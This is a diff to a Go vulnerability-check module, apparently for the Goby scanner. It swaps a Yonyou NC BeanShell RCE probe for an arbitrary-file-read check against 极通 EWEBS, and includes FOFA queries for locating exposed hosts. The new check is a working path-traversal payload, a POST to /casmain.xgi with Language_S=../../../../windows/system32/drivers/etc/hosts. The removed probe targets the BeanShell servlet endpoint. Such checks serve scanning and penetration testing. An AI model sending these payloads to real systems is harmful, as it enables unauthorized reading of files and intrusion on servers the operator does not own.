@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "极通EWEBS casmain.xgi 任意文件读取漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"新软科技-极通EWEBS\" || product=\"新软科技-极通EWEBS\"",
+  "GobyQuery": "app=\"新软科技-极通EWEBS\" || product=\"新软科技-极通EWEBS\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,12 +29,12 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/casmain.xgi",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
-        "data": ""
+        "data": "Language_S=../../../../windows/system32/drivers/etc/hosts"
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +51,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "localhost",
             "bz": ""
           }
         ]
@@ -107,7 +107,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "极通EWEBS casmain.xgi 任意文件读取漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +116,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "JT EWEBS file read",
       "Product": "",
       "Description": "",
       "Recommendation": "",
